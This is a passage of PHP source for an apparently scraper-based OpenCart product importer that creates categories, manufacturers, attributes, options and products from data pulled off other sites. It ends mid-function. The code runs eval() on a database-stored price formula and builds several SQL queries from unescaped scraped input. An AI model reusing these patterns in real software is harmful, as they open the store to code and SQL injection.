<?php

define("HOST_DIR", '../hr76fdnwopz8e4poih5srdg6q0sangu43tr56dcfjht/');
define("PLATFORM", 'OpenCart 1.5+');

function find_manufacturer()
{
    global $name, $model, $mans, $manufacturer;
    if (!$mans) $mans = GetManufacturers();
    $found = array();
    $name2 = strtolower($name);
    foreach ($mans as $man) {
        $mask = strtolower($man["name"]);
        if (($p = strpos($name2, $mask)) !== false) if (!ctype_alpha(@$name[$p + strlen($mask)])) $found[$p] = $man["name"];
    }
    if (!$found) return false;
    $p = min(array_keys($found));
    $manufacturer = $found[$p];
    $model = trim(substr($name, $p + strlen($manufacturer)));
    if ($model == "") $model = $name;
    return $manufacturer;
}

function GetHtmlImages($html)
{
    if (!trim($html)) return $html;
    $imgs = array_merge(insides(' src="', '"', $html), insides(" src='", "'", $html));
    $imgs_data = array_merge(insides(' data-src="', '"', $html), insides(" data-src='", "'", $html));
    $imgs = array_merge($imgs, $imgs_data);
    global $description_files;
    foreach ($imgs as $img) if (in_array(substr($img, strrpos($img, '.') + 1), $description_files)) {
        if (substr($img, 0, 14) == "image/data/mx/") continue;
        $new = GetImage(url($img));
        if ($new) $html = replace($img, 'image/' . $new, $html);
    }
    $hrefs = array_merge(insides(' href="', '"', $html), insides(" href='", "'", $html));
    global $description_files;
    foreach ($hrefs as $href) if (in_array(substr($href, strrpos($href, '.') + 1), $description_files)) {
        if (substr($href, 0, 14) == "image/data/mx/") continue;
        $pic_dir = 'data/mx/files/';
        $pic_fdir = '../image/' . $pic_dir;
        if (!file_exists($pic_fdir)) mkdir($pic_fdir);
        $new = get_file(url($href), $pic_fdir, $pic_dir);
        if ($new) $html = replace($href, 'image/' . $new, $html);
    }
    return $html;
}

function attribute($name, $source = '')
{
    if (!$source) $source = g('attributes');
    if (!is_array(reset($source))) $source = array($source);
    foreach ($source as $group) {
        $left = true;
        $found = false;
        foreach ($group as $value) {
            if ($left and $value == $name) $found = true;
            if (!$left and $found) return $value;
            $left = !$left;
        }
    }
    return '';
}

function take_attribute($name)
{
    $r = attribute($name);
    del_attribute($name);
    return $r;
}

function del_attr_helper(&$group, $name)
{
    $left = true;
    $found = false;
    foreach ($group as $index => $value) {
        if ($left and $value == $name) {
            $found = true;
            unset($group[$index]);
        }
        if (!$left and $found) {
            $found = false;
            unset($group[$index]);
        }
        $left = !$left;
    }
}

function del_attribute($name, $source = '')
{
    global $attributes;
    if (!$source) $attr =& $attributes; else $attr =& $source;
    if (!is_array(reset($attr))) del_attr_helper($attr, $name); else foreach ($attr as &$group) del_attr_helper($group, $name);
    return $attr;
}

function currency($price, $code = 'USD')
{
    global $oc_currency;
    $price = preg_replace('/[^0-9.]/i', '', $price);
    $r = $price / $oc_currency[$code]['value'];
    if (DEV) xlogc('currency', $r, $price, $code);
    return $r;
}

function InsertCategory()
{
    global $_categories, $info2, $info3, $category_name, $ins;
    if (g('skip')) {
        xlog('Skip current donor.');
        return;
    }
    add_tasks("list", g('nextpage'), 3);
    $old_info2 = @$info2;
    $current_category = $info2;
    $current_id = 0;
    foreach ($_categories as $c) if (strtoupper($current_category) == strtoupper($c['fullname'])) {
        $current_id = (int)$c['category_id'];
        break;
    }
    if ($category_name and!$current_category and $ins['categories']) {
        $current_id = $ins['categories'][0];
        foreach ($_categories as $c) if ($c['category_id'] == $current_id) $current_category = $c['fullname'];
    }
    @$category_name = codeh($category_name);
    if ($category_name) if (!$current_category) $current_category = $category_name; else $current_category = $current_category . ' &gt; ' . $category_name;
    $cat_id = 0;
    foreach ($_categories as $c) if (strtoupper($current_category) == strtoupper($c['fullname'])) {
        $cat_id = (int)$c['category_id'];
        break;
    }
    if ($current_category and!$cat_id) {
        xlog("Adding <b>$current_category</b> category...");
        global $loader, $category_image, $description;
        if (g('description_images')) $description = GetHtmlImages($description);
        if (!$category_image) $category_image = $info3;
        $loader->load->model('catalog/category');
        $cd = codelang($category_name, 'name');
        codelang(g('meta_keyword'), 'meta_keyword', $cd);
        codelang(g('meta_description'), 'meta_description', $cd);
        codelangh($description, 'description', $cd);
        if (g('skip')) return false;
        $loader->model_catalog_category->addCategory(array('parent_id' => $current_id, 'column' => '1', 'top' => g('top'), 'image' => GetImage($category_image), 'keyword' => g('seo_url'), 'sort_order' => '', 'status' => 1, 'category_description' => $cd, 'category_store' => array(0)));
        global $db;
        $cat_id = getLastId('category');
        $control_name = query("SELECT name FROM " . DB_PREFIX . "category_description WHERE category_id=$cat_id AND language_id=" . g('default_lang_id'))->row['name'];
        if ($category_name != $control_name) xlog("WARNING: Created category save name mismatch: '$category_name' -> '$control_name'");
        $_categories[] = array('name' => $category_name, 'fullname' => $current_category, 'category_id' => $cat_id);
    }
    $info2 = $current_category;
    global $subcategories_images, $info3;
    if (count($subcategories_images)) foreach (g('subcategories') as $i => $sub) {
        @$info3 = $subcategories_images[$i];
        add_tasks("list", $sub, 3);
    } else add_tasks("list", g('subcategories'), 3);
    add_tasks("product", g('products'));
    $info2 = $old_info2;
}

function DonorPassFinished()
{
    global $cache;
    $cache->delete('category');
}

function MissingEntity($type, $platform_id)
{
    global $donor;
    $p = GetProduct($platform_id);
    xlog("NOTICE: Missing <a target='_blank' href='" . HTTP_CATALOG . "index.php?route=product/product&product_id=$platform_id'>" . $p["name"] . "</a>");
    if ($donor['missing'] == 'stock') query("UPDATE " . DB_PREFIX . "product SET quantity = 0 WHERE product_id = " . $platform_id); elseif ($donor['missing'] == 'disable') query("UPDATE " . DB_PREFIX . "product SET status = 0 WHERE product_id = " . $platform_id); elseif ($donor['missing'] == '') DeleteEntity($type, $platform_id);
}

function DeleteProductImages($product_id)
{
    global $loader;
    $loader->load->model('catalog/product');
    $pic_dir = '../image/';
    $p = $loader->model_catalog_product->getProduct($product_id);
    $im = $loader->model_catalog_product->getProductImages($product_id);
    global $donor;
    if (@strpos($p['image'], '/mx/')) {
        unlink($pic_dir . $p['image']);
        $donor['total_files'] -= 1;
    }
    foreach ($im as $i) if (@strpos($i['image'], '/mx/')) {
        unlink($pic_dir . $i['image']);
        $donor['total_files'] -= 1;
    }
}

function DeleteProduct($product_id)
{
    global $loader;
    DeleteProductImages($product_id);
    $loader->model_catalog_product->deleteProduct($product_id);
}

function DeletePlatformEntity($type, $platform_id)
{
    if ($type == 'product') DeleteProduct($platform_id); else die("DeletePlatformEntity unknown entity type");
}

function BeforeEntityProcessing()
{
    $vars = array('name', 'model', 'category', 'categories', 'seo_url', 'h1', 'title', 'meta_keyword', 'meta_description', 'description', 'tags', 'related', 'sku', 'upc', 'ean', 'jan', 'mpn', 'location', 'price', 'tax_class_id', 'quantity', 'minimum', 'subtract', 'stock_status_id', 'shipping', 'keyword', 'date_available', 'length', 'width', 'height', 'length_class_id', 'weight', 'weight_class_id', 'status', 'sort_order', 'manufacturer', 'product_store', 'points', 'main_image', 'images', 'attributes', 'options', 'product', 'id', 'products', 'nextpage', 'update_related', 'update_images', 'update_categories', 'update_description', 'update_status', 'update_stock_status', 'update_name', 'parent_category', 'category_name', 'category_image', 'top', 'manufacturer_image', 'description_images', 'min_image_size', 'max_image_size', 'site_lang');
    foreach ($vars as $var) unset($GLOBALS[$var]);
    global $ins, $categories, $update_quantity, $update_price, $update_attributes, $update_options, $products, $nextpage, $subcategories, $subcategories_images, $image_filename, $description_files;
    $description_files = array('jpg', 'png', 'gif', 'tif');
    $image_filename = '';
    $update_price = true;
    $update_quantity = true;
    $update_attributes = true;
    $update_options = true;
    $categories = $ins['categories'];
    if (!$categories) $categories = array();
    $products = array();
    $nextpage = array();
    $subcategories = array();
    $subcategories_images = array();
}

function LoadInstruction($ins_id)
{
    global $ins;
    if (@$ins['ins_id'] == $ins_id) return;
    $ins = query("SELECT * FROM parsemx_ins WHERE ins_id=$ins_id")->row;
    $ins['categories'] = explode(',', $ins['categories']);
    $ins['price'] = '$price = ' . str_replace('X', '$x', $ins['price']) . ';';
}

function ScriptBeforeSection($section, $f)
{
}

function ScriptAfterSection($section, $f)
{
    if ($section == 'list') fwrite($f, "\n" . 'InsertCategory();' . "\n");
}

function ManufacturerID($manufacturer)
{
    global $loader, $manufacturer_description;
    $manufacturer_id = 0;
    $manufacturer = codeh($manufacturer);
    if (!$manufacturer) return 0;
    $loader->load->model('catalog/manufacturer');
    $m_list = getManufacturers();
    foreach ($m_list as $index => $value) {
        if ($value['name'] == $manufacturer) $manufacturer_id = $value['manufacturer_id'];
    }
    if ($manufacturer_id == 0) {
        $m_desc = array();
        foreach (g('lang') as $value) {
            $data['meta_description'] = '';
            $data['meta_keyword'] = '';
            $data['seo_h1'] = '';
            $data['seo_title'] = '';
            $m_desc[$value] = $data;
        }
        if (g('description_images')) $manufacturer_description = GetHtmlImages($manufacturer_description);
        codelangh($manufacturer_description, 'description', $m_desc);
        $loader->model_catalog_manufacturer->addManufacturer(array('name' => $manufacturer, 'sort_order' => 100, 'manufacturer_store' => array(0 => 0), 'image' => GetImage(g('manufacturer_image')), 'keyword' => '', 'manufacturer_description' => $m_desc));
        $control_name = query("SELECT name FROM " . DB_PREFIX . "manufacturer ORDER BY manufacturer_id DESC LIMIT 1")->row['name'];
        if ($manufacturer != $control_name) xlog("WARNING: Created manufacturer save name mismatch: '$manufacturer' -> '$control_name'");
        $m_list = $loader->model_catalog_manufacturer->getManufacturers();
        foreach ($m_list as $index => $value) {
            if ($value['name'] == $manufacturer) $manufacturer_id = $value['manufacturer_id'];
        }
    }
    return $manufacturer_id;
}

function GetImage($url)
{
    global $donor, $image_filename;
    $url = trim($url);
    if (!$url) return "";
    if (strpos($url, 'http://') === false) return $url;
    if (strpos($url, 'data/mx/')) return $url;
    $pic_dir = 'data/mx/';
    if (strpos($image_filename, '/')) $pic_dir .= substr($image_filename, 0, strrpos($image_filename, '/') + 1);
    $pic_fdir = '../image/' . $pic_dir;
    if (!file_exists($pic_fdir)) mkdir($pic_fdir);
    $r = get_file($url, $pic_fdir, $pic_dir);
    if (substr($r, -4) == '.tif') {
        $r2 = str_replace('.tif', '.jpg', $r);
        rename('../image/' . $r, '../image/' . $r2);
        $r = $r2;
    }
    if ($r) {
        $size = filesize('../image/' . $r);
        if (g('min_image_size')and($size < g('min_image_size'))) $size = 0;
        if (g('max_image_size')and($size > g('max_image_size'))) $size = 0;
        if (!$size) {
            @unlink('../image/' . $r);
            $donor['total_files'] -= 1;
            $r = '';
        }
    }
    if ($r) xlog("<a href='$url' target='_blank'><img src='$url' style='height:40px; width:auto'></a>");
    return $r;
}

function addAttribute($data)
{
    global $db;
    query("INSERT INTO " . DB_PREFIX . "attribute SET attribute_group_id = '" . (int)$data['attribute_group_id'] . "', sort_order = '" . (int)$data['sort_order'] . "'");
    $attribute_id = $db->getLastId();
    foreach ($data['attribute_description'] as $language_id => $value) {
        query("INSERT INTO " . DB_PREFIX . "attribute_description SET attribute_id = '" . (int)$attribute_id . "', language_id = '" . (int)$language_id . "', name = '" . escape($value['name']) . "'");
    }
    return $attribute_id;
}

function addAttributeGroup($data)
{
    global $db;
    $sql = "INSERT INTO " . DB_PREFIX . "attribute_group SET sort_order = '" . (int)$data['sort_order'] . "'";
    query($sql);
    $attribute_group_id = $db->getLastId();
    foreach ($data['attribute_group_description'] as $language_id => $value) {
        query("INSERT INTO " . DB_PREFIX . "attribute_group_description SET attribute_group_id = '" . (int)$attribute_group_id . "', language_id = '" . (int)$language_id . "', name = '" . escape($value['name']) . "'");
    }
    return $attribute_group_id;
}

function process_attributes()
{
    global $loader, $attributes;
    if (empty($attributes)) return array();
    $attr = array();
    if (is_array(reset($attributes))) {
        foreach (array_keys($attributes) as $key) {
            $attr[] = $key;
            $attr[] = '';
            foreach ($attributes[$key] as $value) {
                if (!trim($value)) $value = '!@#';
                $attr[] = $value;
            }
        }
    } else $attr = $attributes;
    $p = true;
    foreach ($attr as $a) {
        $a = codeh($a);
        if ($p) {
            $name = trim($a);
            if (substr($name, -1) == ':') $name = substr($name, 0, -1);
        } else $new[] = array('name' => $name, 'value' => $a);
        $p = !$p;
    }
    $attr = $new;
    $atributes_to_add = array();
    $z_order = 100;
    if (count($attr) > 0) {
        $loader->load->model('catalog/attribute_group');
        $loader->load->model('catalog/attribute');
        $a_groups_temp = $loader->model_catalog_attribute_group->getAttributeGroups();
        $default_group = '';
        foreach ($a_groups_temp as $value) {
            $a_groups[$value['name']] = $value['attribute_group_id'];
        }
        $b_groups = array();
        $current_group = '';
        $s = 1;
        foreach ($attr as $value) {
            $atribute_name_org = $value['name'];
            if (g('site_language')) $atribute_name = translate($atribute_name_org, g('site_language'), g('default_lang')); else $atribute_name = $atribute_name_org;
            $atribute_value = $value['value'];
            if ($current_group == '') $current_group = $default_group;
            if (($atribute_name != '')and($atribute_value == '')) $current_group = $atribute_name;
            if ($atribute_value == '!@#') $atribute_value = '';
            if ($current_group != '') {
                if (isset($a_groups[$current_group])) {
                    $current_group_id = $a_groups[$current_group];
                    if (!isset($b_groups[$current_group_id])) {
                        $b_groups[$current_group_id] = $loader->model_catalog_attribute->getAttributes(array('filter_attribute_group_id' => $current_group_id));
                    }
                } else {
                    $agd = codelang($atribute_name_org, 'name');
                    if (!g('skip')) {
                        $current_group_id = addAttributeGroup(array('sort_order' => $z_order++, 'attribute_group_description' => $agd));
                        $control_name = query("SELECT name FROM " . DB_PREFIX . "attribute_group_description  WHERE language_id=" . g('default_lang_id') . " ORDER BY attribute_group_id DESC LIMIT 1")->row['name'];
                        if ($current_group != $control_name) xlog("WARNING: Created attribute group save name mismatch: '$current_group' -> '$control_name'");
                    } else $current_group_id = rand(10000, 100000);
                    $b_groups[$current_group_id] = array();
                    $a_groups[$current_group] = $current_group_id;
                }
                if ($atribute_value != '') {
                    $atribute_id = 0;
                    if (count($b_groups[$current_group_id]) > 0) {
                        foreach ($b_groups[$current_group_id] as $index => $value) {
                            if ($value['name'] == $atribute_name) $atribute_id = $value['attribute_id'];
                        }
                    }
                    if ($atribute_id == 0) {
                        $ad = codelang($atribute_name_org, 'name');
                        if (!g('skip')) {
                            $atribute_id = addAttribute(array('attribute_group_id' => $current_group_id, 'sort_order' => 10 * $s, 'attribute_description' => $ad));
                            $control_name = query("SELECT name FROM " . DB_PREFIX . "attribute_description WHERE language_id=" . g('default_lang_id') . " ORDER BY attribute_id DESC LIMIT 1")->row['name'];
                            if ($atribute_name != $control_name) xlog("WARNING: Created attribute save name mismatch: '$atribute_name' -> '$control_name'");
                        } else $atribute_id = rand(10000, 100000);
                        $s += 1;
                    }
                    $pad = codelang($atribute_value, 'text');
                    $atributes_to_add[] = array('name' => $atribute_name, 'attribute_id' => $atribute_id, 'product_attribute_description' => $pad);
                }
            }
        }
    }
    return $atributes_to_add;
}

function is_image($link)
{
    return strpos($link, 'ttp://') || (substr($link, 0, 5) == 'data/');
}

function process_options()
{
    global $loader;
    $MY = g('options');
    if (empty($MY)) return array();
    $loader->load->model('catalog/option');
    $res = array();
    $z_order = 100;
    foreach (array_keys($MY) as $key) {
        $name = trim(str_replace('  ', ' ', $key));
        $name = codeh($name);
        if ($p = strpos($name, '_')) {
            $otype = substr($name, $p + 1);
            $name = substr($name, 0, $p);
        } else $otype = "radio";
        if (substr($name, -1) == ':') $name = substr($name, 0, -1);
        $name_tr = $name;
        if (g('site_language')) $name_tr = translate($name, g('site_language'), g('default_lang'));
        $q = query("SELECT o.option_id FROM `" . DB_PREFIX . "option` o LEFT JOIN " . DB_PREFIX . "option_description od ON (o.option_id = od.option_id) WHERE name ='" . $name_tr . "'")->row;
        if ($q) $option_id = $q['option_id']; else {
            $odata = array('type' => $otype, 'sort_order' => $z_order++);
            $odata['option_description'] = codelang($name, 'name');
            if (!g('skip')) {
                $loader->model_catalog_option->addOption($odata);
                $control_name = query("SELECT name FROM " . DB_PREFIX . "option_description WHERE language_id=" . g('default_lang_id') . " ORDER BY option_id DESC LIMIT 1")->row['name'];
                if ($name != $control_name) xlog("WARNING: Created option save name mismatch: '$name' -> '$control_name'");
                $option_id = query("SELECT * FROM `" . DB_PREFIX . "option` o LEFT JOIN " . DB_PREFIX . "option_description od ON (o.option_id = od.option_id) WHERE name ='" . $name . "'")->row['option_id'];
            } else $option_id = rand(10000, 100000);
        }
        $option = $loader->model_catalog_option->getOption($option_id);
        $options = $loader->model_catalog_option->getOptionValues($option['option_id']);
        $n_options = array();
        $f_options = array();
        $f_cost = array();
        $f_img = array();
        if (@is_numeric($MY[$key][1])) if (@is_image($MY[$key][2])) {
            $first = 0;
            foreach ($MY[$key] as $value) {
                switch ($first) {
                    case 0:
                        $f_options[] = $value;
                        break;
                    case 1:
                        $f_cost[] = $value;
                        break;
                    case 2:
                        $f_img[] = $value;
                        break;
                }
                $first++;
                if ($first > 2) $first = 0;
            }
        } else {
            $first = false;
            foreach ($MY[$key] as $value) if ($first = !$first) $f_options[] = $value; else $f_cost[] = $value;
        } else if (@is_image($MY[$key][1])) {
            $first = false;
            foreach ($MY[$key] as $value) if ($first = !$first) $f_options[] = $value; else $f_img[] = $value;
        } else $f_options = $MY[$key];
        $n_cost = array();
        $z_order2 = 100;
        foreach ($f_options as $f_index => $f_option) {
            $find = false;
            $f_option = codeh($f_option);
            $f_options[$f_index] = $f_option;
            $f_option_tr = $f_option;
            if (g('site_language')) $f_option_tr = translate($f_option, g('site_language'), g('default_lang'));
            foreach ($options as $index => $value) {
                if ($value['name'] == $f_option_tr) {
                    $n_options[] = $value;
                    $n_cost[] = @$f_cost[$f_index];
                    $n_img[] = @$f_img[$f_index];
                    $find = true;
                }
            }
            if (!$find) {
                $img = @$f_img[$f_index];
                if (!$img) $img = 'no_image.jpg'; else $img = GetImage($img);
                $option_value = array('name' => $f_option, 'image' => $img, 'sort_order' => $z_order2++);
                $add_to_base = $option_value;
                $add_to_base['option_value_description'] = codelang($f_option, 'name');
                if (!g('skip')) {
                    $new_option = addOptionValue($option_id, $add_to_base);
                    $control_name = query("SELECT name FROM " . DB_PREFIX . "option_value_description WHERE language_id=" . g('default_lang_id') . " ORDER BY option_value_id DESC LIMIT 1")->row['name'];
                    if ($f_option != $control_name) xlog("WARNING: Created option save name mismatch: '$f_option' -> '$control_name'");
                } else $new_option = rand(10000, 100000);
                $option_value['option_value_id'] = $new_option;
                $n_options[] = $option_value;
                $n_cost[] = @$f_cost[$f_index];
            }
        }
        foreach ($n_options as $index => $value) {
            $n_options[$index]['product_option_value_id'] = '';
            $n_options[$index]['quantity'] = '100';
            $n_options[$index]['subtract'] = '1';
            $n_options[$index]['price_prefix'] = '+';
            if (@$n_cost[$index]) {
                $x = preg_replace('/[^0-9,.]/i', '', $n_cost[$index]);
                $price = 1;
                global $ins;
                eval($ins['price']);
                $n_cost[$index] = $price;
            } else $n_cost[$index] = '';
            $n_options[$index]['price'] = $n_cost[$index];
            $n_options[$index]['points_prefix'] = '+';
            $n_options[$index]['points'] = '';
            $n_options[$index]['weight_prefix'] = '+';
            $n_options[$index]['weight'] = '';
        }
        $n_option = $option;
        $n_option['product_option_value'] = $n_options;
        $n_option['required'] = 1;
        if ($n_options) $res[] = $n_option;
    }
    return $res;
}

function addOptionValue($option_id, $option_value)
{
    global $db;
    query("INSERT INTO " . DB_PREFIX . "option_value SET option_id = " . (int)$option_id . ", image = '" . escape(html_entity_decode($option_value['image'], ENT_QUOTES, 'UTF-8')) . "', sort_order = '" . (int)$option_value['sort_order'] . "'");
    $option_value_id = $db->getLastId();
    foreach ($option_value['option_value_description'] as $language_id => $option_value_description) {
        query("INSERT INTO " . DB_PREFIX . "option_value_description SET option_value_id = '" . (int)$option_value_id . "', language_id = '" . (int)$language_id . "', option_id = '" . (int)$option_id . "', name = '" . escape($option_value_description['name']) . "'");
    }
    return $option_value_id;
}

function codeh($text)
{
    $text = trim($text);
    if (!strpos($text, ';')) $text = str_replace('&', '&amp;', $text);
    $tags = array("br", "a ", "/a", "img ");
    $start = 0;
    $p = 0;
    while (true) {
        $p = strpos($text, "<", $p);
        if ($p === false) $p = strlen($text);
        $sub = substr($text, $start, $p - $start);
        $sub2 = str_replace(array('<', '>', '"', "'"), array('&lt;', '&gt;', '&quot;', '&#039;'), $sub);
        $text = substr($text, 0, $start) . $sub2 . substr($text, $p);
        $p += strlen($sub2) - strlen($sub);
        $start = $p;
        if ($p >= strlen($text)) break;
        $p++;
        $save = false;
        foreach ($tags as $tag) if (strtolower(substr($text, $p, strlen($tag))) == $tag) {
            $save = true;
            break;
        }
        if ($save) {
            $p2 = strpos($text, ">", $p);
            if ($p2) {
                $start = $p2 + 1;
                $p = $p2 + 1;
            }
        }
    }
    return $text;
}

function codelangh($text, $key = '', &$arr = false)
{
    if (is_array($text)and is_numeric(key($text))) $text = '<p>' . implode('</p><p>', $text) . '</p>';
    if ($arr) $r =& $arr; else $r = array();
    global $default_lang, $site_language;
    $otext = $text;
    if (!$key) foreach (g('lang') as $code => $id) {
        if ($site_language) $text = translate($otext, $site_language, $code);
        if (is_string($text)) $r[$id] = htmlspecialchars($text); elseif (!empty($text[$code])) $r[$id] = htmlspecialchars($text[$code]); else $r[$id] = htmlspecialchars($text[$default_lang]);
    } else foreach (g('lang') as $code => $id) {
        if ($site_language) $text = translate($otext, $site_language, $code);
        if (is_string($text)) $r[$id][$key] = htmlspecialchars($text); elseif (!empty($text[$code])) $r[$id][$key] = htmlspecialchars($text[$code]); else $r[$id][$key] = htmlspecialchars($text[$default_lang]);
    }
    return $r;
}

function codelang($text, $key = '', &$arr = false)
{
    if (is_array($text)and is_numeric(key($text))) $text = '<p>' . implode('</p><p>', $text) . '</p>';
    if ($arr) $r =& $arr; else $r = array();
    global $default_lang, $site_language;
    $otext = $text;
    if (!$key) foreach (g('lang') as $code => $id) {
        if ($site_language) $text = translate($otext, $site_language, $code);
        if (is_string($text)) $r[$id] = codeh($text); elseif (!empty($text[$code])) $r[$id] = codeh($text[$code]); else $r[$id] = codeh($text[$default_lang]);
    } else foreach (g('lang') as $code => $id) {
        if ($site_language) $text = translate($otext, $site_language, $code);
        if (is_string($text)) $r[$id][$key] = codeh($text); elseif (!empty($text[$code])) $r[$id][$key] = codeh($text[$code]); else $r[$id][$key] = codeh($text[$default_lang]);
    }
    return $r;
}

function getLastId($table, $idfield = false)
{
    if (!$idfield) $idfield = $table . '_id';
    return query("SELECT $idfield FROM " . DB_PREFIX . "$table ORDER BY $idfield DESC LIMIT 1")->row[$idfield];
}

function InsertProduct()
{
    global $donor, $ins, $name, $id, $description_images, $update_status;
    if (!$name) {
        xlog('No name, skipping product.');
        return false;
    }
    if (!isset($update_status)and($donor['missing'] == 'disable')) $update_status = true;
    $model = g('model', g('name'));
    $model = utf8_substr($model, 0, 60);
    if (empty($id)) $id = g('url');
    if (strpos($id, '://')) $id = urlencode($id);
    $product_id = EntityPlatformId($id);
    if ($product_id) {
        $q = query("SELECT product_id FROM " . DB_PREFIX . "product WHERE product_id=$product_id")->row;
        if (!$q) {
            DeleteEntity('product', $product_id);
            $product_id = 0;
        }
    }
    if (g('test') && $product_id) {
        DeleteEntity('product', $product_id);
        $product_id = 0;
    };
    $foreign = false;
    global $product_match;
    if (!$product_id and $product_match) {
        if ($product_match == 'product_id') $product_match = 'p.product_id';
        $q = query("SELECT p.product_id FROM " . DB_PREFIX . "product p LEFT JOIN " . DB_PREFIX . "product_description pd ON (p.product_id=pd.product_id) WHERE " . $product_match . "='$id'")->row;
        if ($q) $product_id = $q['product_id'];
        $foreign = true;
    }
    global $categories, $_categories;
    if (g('category')) $categories = array_merge(array(g('category')), $categories);
    $master_category = g('info2');
    while ($master_category) {
        $cat_id = 0;
        foreach ($_categories as $c) if (strtoupper($master_category) == strtoupper($c['fullname'])) {
            $cat_id = (int)$c['category_id'];
            break;
        }
        if ($cat_id) $categories = array_merge(array($cat_id), $categories);
        $master_category = substr($master_category, 0, strrpos($master_category, ' &gt; '));
    }
    foreach ($categories as &$cat) {
        if (!is_numeric($cat)) {
            $cat = codeh($cat);
            foreach ($_categories as $c) if (strtoupper($cat) == strtoupper(trim($c['name']))) {
                $cat = (int)$c['category_id'];
                break;
            }
        }
        if (!is_numeric($cat)) {
            if (!trim($cat)) {
                unset($cat);
                continue;
            }
            global $loader, $parent_category;
            $loader->load->model('catalog/category');
            $cd = codelang($cat, 'name');
            codelang('', 'meta_keyword', $cd);
            codelang('', 'meta_description', $cd);
            codelangh('', 'description', $cd);
            $parent_id = '';
            if (!empty($parent_category)) {
                $parent_category = trim($parent_category);
                foreach ($_categories as $c) if (strcasecmp($parent_category, $c['name']) == 0) {
                    $parent_id = (int)$c['category_id'];
                    break;
                }
                if (!$parent_id) xlog("NOTICE! Parent category '$parent_category' not found.");
            }
            if (!g('skip')) $loader->model_catalog_category->addCategory(array('parent_id' => $parent_id, 'column' => '1', 'keyword' => '', 'sort_order' => '', 'status' => 1, 'category_description' => $cd, 'category_store' => array(0)));
            global $db;
            $cat_id = getLastId('category');
            $control_name = query("SELECT name FROM " . DB_PREFIX . "category_description WHERE category_id=$cat_id  AND language_id=" . g('default_lang_id'))->row['name'];
            if ($cat != $control_name) xlog("WARNING: Created category save name mismatch: '$cat' -> '$control_name'");
            $_categories[] = array('name' => $cat, 'fullname' => $cat, 'category_id' => $cat_id);
            $cat = $cat_id;
        }
    }
    $categories = array_unique($categories);
    global $update_categories;
    if (($update_categories == 0) && $product_id) {
        $pcats = query("SELECT category_id FROM " . DB_PREFIX . "product_to_category WHERE product_id = '" . (int)$product_id . "'")->rows;
        $add = array();
        foreach ($categories as $c) {
            if (!$c) continue;
            $found = false;
            foreach ($pcats as $pcat) if ($c == $pcat['category_id']) {
                $found = true;
                break;
            }
            if (!$found) $add[] = $c;
        }
        foreach ($add as $category_id) query("INSERT INTO " . DB_PREFIX . "product_to_category SET product_id = '" . (int)$product_id . "', category_id = '" . (int)$category_id . "'");
    }
    if ($update_categories == -1) $update_categories = 0;
    if (g('seo_url')) $GLOBALS['keyword'] = g('seo_url');
    global $tags, $description;
    if (!$product_id or g('update_description')) if ($description_images) $description = GetHtmlImages($description);
    if (empty($tags)) $tags = g('meta_keyword');
    $pd = codelang(g('name'), 'name');
    codelang(g('h1'), 'seo_h1', $pd);
    codelang(g('title'), 'seo_title', $pd);
    codelang(g('meta_keyword'), 'meta_keyword', $pd);
    codelang(g('meta_description'), 'meta_description', $pd);
    codelangh($description, 'description', $pd);
    codelang($tags, 'tag', $pd);
    $product_tag = codelang($tags);
    $product_reward = array(6 => array('points' => ''), 8 => array('points' => ''));
    global $related;
    if (isset($related[0]['product_id'])) {
        $r = array();
        foreach ($related as $val) $r[] = $val['product_id'];
        $related = $r;
    }
    if (is_array($related)) {
        $r = array_search($product_id, $related);
        if ($r !== false) unset($related[$r]);
    }
    $product = array('product_description' => $pd, 'product_tag' => $product_tag, 'model' => $model, 'sku' => g('sku'), 'upc' => g('upc'), 'ean' => g('ean'), 'jan' => g('jan'), 'isbn' => g('isbn'), 'mpn' => g('mpn'), 'location' => g('location'), 'tax_class_id' => g('tax_class_id', '0'), 'quantity' => g('quantity', '1000'), 'minimum' => g('minimum', '1'), 'subtract' => g('subtract', '1'), 'stock_status_id' => g('stock_status_id', '8'), 'shipping' => g('shipping', '1'), 'keyword' => g('keyword'), 'date_available' => g('date_available', date("Y-m-d")), 'length' => g('length'), 'width' => g('width'), 'height' => g('height'), 'length_class_id' => g('length_class_id', '1'), 'weight' => g('weight'), 'weight_class_id' => g('weight_class_id', '1'), 'status' => g('status', '1'), 'sort_order' => '1', 'manufacturer_id' => empty($GLOBALS['manufacturer']) ? $ins['manufacturer'] : ManufacturerID(g('manufacturer')), 'main_category_id' => @$categories[0], 'product_category' => $categories, 'product_store' => g('product_store', array('0')), 'related' => '', 'option' => '', 'points' => g('points'), 'product_reward' => $product_reward, 'product_layout' => array(0 => array('layout_id' => '')));
    if ($related) $product['product_related'] = $related;
    $x = g('price');
    $x = preg_replace('/[^0-9,.]/i', '', g('price'));
    $price = $x;
    eval($ins['price']);
    $price = ((int)($price * 100)) / 100;
    $product['price'] = $price;
    $product['product_attribute'] = process_attributes();
    $product['product_option'] = process_options();
    if (g('skip')) return false;
    if ($product_id and g('update_images')) DeleteProductImages($product_id);
    if (!$product_id or g('update_images')) {
        global $main_image, $images;
        if (empty($images)) $images = array();
        if ($main_image) $images = array_merge(array($main_image), $images);
        $product_image = array();
        $z = 10;
        $images = array_unique($images);
        foreach ($images as $filename) {
            $filename = GetImage($filename);
            if (!$filename) continue;
            if (empty($product['image'])) {
                $product['image'] = $filename;
                continue;
            }
            $product_image[] = array('image' => $filename, 'sort_order' => $z);
            $z += 10;
        }
        $product['product_image'] = $product_image;
        $images = array();
    }
    $p = g('product');
    if (is_array($p)and count($p)) $product = array_merge($product, $p);
    global $last_product_id;
    if ($product_id == 0) {
        global $loader, $url;
        $loader->load->model('catalog/product');
        @$loader->model_catalog_product->addProduct($product);
        $product_id = query("SELECT product_id FROM " . DB_PREFIX . "product ORDER BY product_id DESC LIMIT 1")->row['product_id'];
        AddEntity($id, 'product', $product_id);
        $last_product_id = $product_id;
        xlog('NOTICE: Product added: <a href="' . LastInsertedEntityURL() . '" target="_blank">' . g('name') . '</a>');
    } else {
        if (!g('update_description')) $product['product_description'] = array();
        $options = isset($product['product_option']) ? $product['product_option'] : array();
        $atributes = isset($product['product_attribute']) ? $product['product_attribute'] : array();
        updateProduct($product_id, $product, $options, $atributes);
        $last_product_id = $product_id;
        xlog('Product updated: <a href="' . LastInsertedEntityURL() . '" target="_blank">' . g('name') . '</a>');
    }
    return $product_id;
}

;
function LastInsertedEntityURL()
{
    global $last_product_id;
    if ($last_product_id) return HTTP_CATALOG . "index.php?route=product/product&product_id=$last_product_id"; else return false;
}

function GetProduct($product_id)
{
